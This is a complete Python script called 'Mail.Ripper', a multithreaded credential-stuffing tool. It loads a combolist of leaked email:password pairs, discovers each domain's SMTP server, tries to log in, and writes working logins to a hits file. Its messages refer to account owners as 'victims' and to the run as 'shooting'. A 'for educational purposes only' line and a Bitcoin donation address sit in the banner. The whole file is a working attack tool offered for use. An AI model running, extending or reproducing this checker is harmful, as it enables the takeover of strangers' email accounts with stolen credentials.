#!/usr/local/bin/python3
#encoding: utf-8
#name: Mail.Ripper v1
#description: basic e-mail checker using smtplib
#version: 0.3, 2020-10-18
#author: DrPython3
#TODO: include / improve SMTP ports, proxy support, try to send mail, SSL (...)

#((--> *M*O*D*U*L*E*S***N*E*E*D*E*D* <--))
import ctypes, os, smtplib, socket, sys, ssl, threading, time
from time import sleep
import colorama
from colorama import *
import json
init()
print(Fore.GREEN + Style.BRIGHT + '')

#((--> *S*T*A*R*T*U*P***L*O*G*O* <--))
logo1 = '''
-------------------------------------------------------------------------
                                                                         
o     o         o 8     .oPYo.  o                                     .o 
8b   d8           8     8   `8                                         8 
8`b d'8 .oPYo. o8 8    o8YooP' o8 .oPYo. .oPYo. .oPYo. oPYo.   o    o  8 
8 `o' 8 .oooo8  8 8     8   `b  8 8    8 8    8 8oooo8 8  `'   Y.  .P  8 
8     8 8    8  8 8     8    8  8 8    8 8    8 8.     8       `b..d'  8 
8     8 `YooP8  8 8 88  8    8  8 8YooP' 8YooP' `Yooo' 8        `YP'   8 
..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::
-------------------------------------------------------------------------'''
logo2 = '''
              simple email checker by: DrPython3 (C) 2020
                 *** FOR EDUCATIONAL PURPOSES ONLY ***
                 
          DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
'''




#((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))
combofile = ''
combos = []
tout = float(5.0)
skip = 1
freddys = int(5)
valid = 0
bad = 0

# included a json config file to make it easy to add more host and subdomain

try:   # trying to make sure config is available before i continue
    with open('config.json') as config:
        jsonobj = json.load(config)


    hosters = (jsonobj['hosters'])
    subh = (jsonobj['subh'])
    subp = (jsonobj['subp'])
    blacklisted = (jsonobj['blacklisted'])



    #((--> *F*U*N*C*T*I*O*N*S* <--))


    #cleaner == clears screen on purpose:
    def cleaner():
        try:
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass

    #hits == saves hits to a txt file:
    def hits(hitstext):
        with open('hits.txt', 'a') as hitsfile:
            hitsfile.write(hitstext + '\n')
            hitsfile.close()

    #skips == saves skipped combos to a txt file:
    def skips(skiptext):
        with open('skipped.txt', 'a') as skippedfile:
            skippedfile.write(skiptext + '\n')
            skippedfile.close()

    #blackcheck == searches for smtp domain in blacklist:
    def blackcheck(search):
        try:
            x = int(blacklisted.count(str(search)))
            if x == 0:
                return False
            else:
                return True
        except:
            pass

    #finder == search for unknown smtp hosts:
    #TODO: make more verbose, add port for SMTP (...)
    def finder(unkdom):
        socket.setdefaulttimeout(tout)
        z = ''
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + 'Trying to find SMTP-host for: ' + str(unkdom) + '\n')
        try:
            for x in subh:
                y = str(x) + str(unkdom)
                try:
                    findsmtp = smtplib.SMTP_SSL(str(y))
                    findsmtp.close()
                    z = str(y)
                except:
                    try:
                        findsmtp = smtplib.SMTP(str(y))
                        findsmtp.close()
                        z = str(y)
                    except:
                        continue
            return z
        except BaseException:
            z = None
            return z

    #checkmate == the main checker based on smtplib:
    #TODO: Improve with SMTP ports, SSL support, probably SOCKS proxys (...)
    def checkmate():
        global valid
        global bad
        socket.setdefaulttimeout(tout)
        while len(combos) > 0:
            try:
                l = combos.pop(0).split(":")
                if skip == 1:
                    blackhost = blackcheck(str(l[0].split("@")[1]))
                    if blackhost == True:
                        skips(l[0] + ':' + l[1])
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'BAD LUCK, SKIPPED: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
                        bad += 1
                        continue
                    else:
                        pass
                try:
                    targethost = hosters[str(l[0].split("@")[1])]
                except:
                    try:
                        newhost = finder(str(l[0].split("@")[1]))
                        if newhost == None:
                            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HOST FOUND FOR: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
                            skips(l[0] + ':' + l[1])
                            continue
                        else:
                            targethost = str(newhost)
                    except:
                        pass
                try:
                    attack = smtplib.SMTP_SSL(str(targethost))
                    attack.ehlo()
                except:
                    try:
                        attack = smtplib.SMTP(str(targethost))
                        attack.ehlo()
                    except:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'CONNECTION ERROR FOR: ' + str(l[0]) + ' | ' + str(l[1]) + '.\n')
                        bad += 1
                        continue
                try:
                    attack.starttls()
                    attack.ehlo()
                except:
                    pass
                attack.login(str(l[0]), str(l[1]))
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'HIT ON VICTIM --> USER: ' + str(l[0]) + ', PASS: ' + str(l[1]) + '.\n')
                hits('SERVER: ' + str(targethost) + ', USER: ' + str(l[0]) + ', PASS: ' + str(l[1]))
                try:
                    attack.close()
                except:
                    pass
                valid += 1
            except:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HIT FOR : ' + str(l[0]) + ' | ' + str(l[1]) + '\n')
                bad += 1

    #((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))
    #startup on clean screen with logos:
    cleaner()
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
    print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)

    #ask for name of combofile:
    combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')

    #check combofile:
    if combofile == '':
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nNo filename entered. Bye bye!\n')
    else:
        try:
            combos = open(combofile, 'r').read().splitlines()
        except:
            cleaner()
            sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile not found. Check filename and start again!\n')

    #return amount of combos to check:
    tocheck = len(combos)
    if tocheck == 0:
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile is empty. Bye bye!\n')
    else:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')

    #ask for default timeout:
    try:
        tout = float(input(Fore.LIGHTWHITE_EX + '\nEnter value of timeout (any key for default = 5.0) :     '))
    except:
        tout = float(5.0)
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')

    #ask for amount of threads to use:
    try:
        freddys = int(input(Fore.LIGHTWHITE_EX + '\nEnter amount of threads to use (any key for default = 5) :     '))
    except:
        freddys = int(5)
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(freddys) + ' ...\n')

    #ask for skipping options:
    skipuser = input(Fore.LIGHTWHITE_EX + '\nDo you want to skip services like GMAIL (yes / no, any key for default = yes) :    ')
    if skipuser == 'no':
        skip = 0
    elif skipuser == 'n':
        skip = 0
    else:
        skip = 1
    if skip == 0:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: Services like GMAIL etc. will not be skipped! You probably waste your time ...\n')
    else:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL etc. will be skipped and saved to a txt-file ...\n')

    #ask to start checking:
    startnow = input(Fore.LIGHTWHITE_EX + '\nDO YOU WANT TO START THE CHECKER NOW? (yes / no) :     ')
    if startnow == 'no':
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
    elif startnow == 'n':
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
    else:
        pass

    #start checker:
    cleaner()
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now  ...\n\n')
    for _ in range(freddys):
        threading.Thread(target=checkmate).start()
    while len(combos) > 0:
        try:
            #Show stats in title bar if run on Windows:
            sleep(0.1)
            ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
        #Skip stats in title bar on any other OS:
        except:
            pass

except:
    print('No input or config.json not found\nClosing and Goodbye ****************** ')
    time.sleep(5)
